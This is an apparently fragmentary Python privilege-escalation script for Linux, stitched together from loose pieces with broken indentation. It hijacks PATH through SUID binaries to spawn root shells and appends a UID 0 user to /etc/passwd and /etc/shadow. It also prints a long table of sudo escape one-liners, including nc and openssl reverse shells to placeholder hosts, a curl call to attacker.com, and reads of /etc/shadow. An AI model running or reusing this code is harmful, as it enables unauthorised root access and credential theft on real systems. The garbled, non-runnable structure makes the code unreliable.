# find executables in SUID scripts that do not specify full path of command
os.system("echo '### the following are possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
   os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/path.txt")
   print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
   with open("/tmp/path.txt") as root_files:
      lines = root_files.readlines()
      for line in lines:
         os.system("file {} > /tmp/file.txt".format(line))
         with open("/tmp/file.txt") as file:
            f = file.readlines()
            for thing in f:
               if "script" in thing or "shell" in thing:
                  split_path = line.split("/")
                  split_path_1 = split_path[-1].strip()
                  os.system("strings {} > /tmp/poss_path.txt".format(line.split()))
                  with open("/tmp/poss_path.txt") as strings_file:
                     lines_strings = strings_file.readlines()
                     for item in lines_strings:
                        for cmd in common_cmds:
                           non_path_cmd = re.search("\s{}\s".format(cmd), str(item))
                           if non_path_cmd:
                              os.system("echo '### {} does not specify full path of {} ###' | tee -a /tmp/path_res.txt".format(line,cmd))
                              os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
                              break
                           else:
                              continue
               else:
                  continue


sudo -S <<< "password" command
echo <password> | sudo -S <command>
echo -e "$PASSWD\n$PASSWD" | passwd $NEWUSR
echo $PASSWD | passwd --stdin $NEWUSR
echo $PASSWD | passwd $NEWUSR
passwd $NEWUSR

 
# add user and pass to /etc/passwd and /etc/shadow
os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
os.system("echo '{}:x:0:0:{}:/home/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
os.system("useradd -p {} {}".format(password,username))


# for path injection
print(line)
            if split_path_1 == "snap-confine":
                continue
            else:
                os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
                with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
                    lines_strings = strings_file.readlines()
                    for cmd in common_cmds:
                        non_path_cmd = re.search("\s{}\s".format(cmd), str(lines_strings))
                        if non_path_cmd:
                            print("### {} does not specify full path of {} ###".format(line,cmd))
                            os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
                            break
                        else:
                            continue




# run sudo -l if password is given
if password != None:
    print("\n### running sudo -l: ###")
    os.system("timeout -k 3 3 sudo -l -S {} | tee /tmp/sudo_l.txt".format(password))
    #os.system("sudo -S < <(echo '{password}') <command>")
    print("\n*** error: couldn't run sudo -l, try running it manually ***")
    sudo_l()
else:
    print("\n*** no password given... coninuing without ")


# try sudo -l if user doesn't requite passwd to run sudo
if sudo_no_pass:
    print("\n### running sudo -l: ###")
    os.system("sudo -l | tee /tmp/sudo_l.txt")

    sudo_l()
else:
    print("\n*** error: couldn't run sudo -l, try running it manually ***")
    return
    


    # find user's sudo capabilties and print how to gain root shell
    if "all" in last_line:
    	print("sudo /bin/bash -p")
        return
    elif "bash" in last_line:
    	print("sudo /bin/bash -p")
        return
    elif "base64" in last_line:
    	print("LFILE=/etc/shadow\nsudo base64 '$LFILE' | base64 --decode")
        return
    elif "cat" in last_line:
    	print("LFILE=/etc/shadow\nsudo cat '$LFILE'")
        return
    elif "chmod" in last_line:
    	print("LFILE=/etc/shadow\nsudo chmod 6777 '$LFILE'")
        return
    elif "cp" in last_line:
    	print("sudo cp /bin/sh /bin/cp\nsudo cp")
        return
    elif "crontab" in last_line:
    	print("sudo crontab -e")
        return
    elif "curl" in last_line:
    	print("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE (to get remote file)")
        return
    elif "docker" in last_line:
    	print("sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
        return
    elif "env" in last_line:
    	print("sudo env /bin/sh")
        return
    elif "ftp" in last_line:
    	print("sudo ftp\n!/bin/sh")
        return
    elif "grep" in last_line:
    	print("LFILE=/etc/passwd\nsudo grep '' $LFILE")
        return
    elif "gzip" in last_line:
    	print("LFILE=/etc/passwd\nsudo gzip -f $LFILE -t")
        return
    elif "more" in last_line:
    	print("TERM= sudo more /etc/profile\n!/bin/sh")
        return
    elif "mount" in last_line:
    	print("sudo mount -o bind /bin/sh /bin/mount\nsudo mount")
        return
    elif "mv" in last_line:
    	print("LFILE=/etc/passwd\nTF=$(mktemp)\necho 'DATA' > $TF\nsudo mv $TF $LFILE")
        return
    elif "mysql" in last_line:
    	print("sudo mysql -e '\\! /bin/sh' (take out one of the slashes!)")
        return
    elif "nano" in last_line:
    	print("sudo nano\n^R^X\nreset; sh 1>&0 2>&0")
        return
    elif "nc" in last_line:
    	print("sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <localIP> <localPORT> >/tmp/f")
        return
    elif "openssl" in last_line:
    	print("(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s")
        return
    elif "perl" in last_line:
    	print("sudo perl -e 'exec '/bin/sh';' (may have to change some to double quotes)")
        return
    elif "php" in last_line:
    	print("CMD='/bin/sh'\nsudo php -r 'system('$CMD');' (might have to change some to double quotes)")
        return
    elif "python" in last_line:
    	print("sudo python -c 'import os; os.system('/bin/sh')' (might have to change some to double quotes)")
        return
    elif "ruby" in last_line:
    	print("sudo ruby -e 'exec '/bin/sh'' (might have to change some to double quotes)")
        return
    elif "scp" in last_line:
    	print("TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x '$TF'\nsudo scp -S $TF x y:")
        return
    elif "ssh" in last_line:
    	print("sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x")
        return
    elif "tar" in last_line:
    	print("sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh")
        return
    elif "vi" in last_line:
    	print("sudo vi -c ':!/bin/sh' /dev/null")
        return
    elif "vim" in last_line:
    	print("sudo vim -c ':!/bin/sh'")
        return
    elif "wget" in last_line:
    	print("TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0")
        return
    else:
    	print("\n*** couldn't find sudo permission for common binaries; try manually ***")
        return
